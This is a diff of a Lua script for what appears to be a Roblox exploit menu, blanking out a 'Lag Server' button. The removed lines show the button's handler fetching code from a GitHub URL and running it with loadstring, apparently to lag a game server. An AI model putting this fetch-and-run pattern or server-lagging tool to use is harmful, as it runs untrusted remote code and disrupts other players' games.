@@ -59,7 +59,7 @@ TextButton_2.Text = "ButtonButtonButton"
 TextButton_2.TextColor3 = Color3.fromRGB(0, 0, 0)
 TextButton_2.TextSize = 16.000
 
-LagServer.Name = "Lag Server"
+LagServer.Name = ""
 LagServer.Parent = Frame
 LagServer.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
 LagServer.BorderSizePixel = 0
@@ -67,13 +67,11 @@ LagServer.Position = UDim2.new(0.575949371, 0, 0.210526317, 0)
 LagServer.Size = UDim2.new(0, 124, 0, 35)
 LagServer.ZIndex = 5
 LagServer.Font = Enum.Font.SourceSans
-LagServer.Text = "Lag Server"
+LagServer.Text = ""
 LagServer.TextColor3 = Color3.fromRGB(0, 0, 0)
 LagServer.TextSize = 16.000
 LagServer.MouseButton1Down:connect(function()
-	LagServer.Text = "Good Luck."
-	wait(3)
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/mrgunz/S/main/lol"))();
+	
 end)
 
 Chat_Bot.Name = "Chat_Bot"
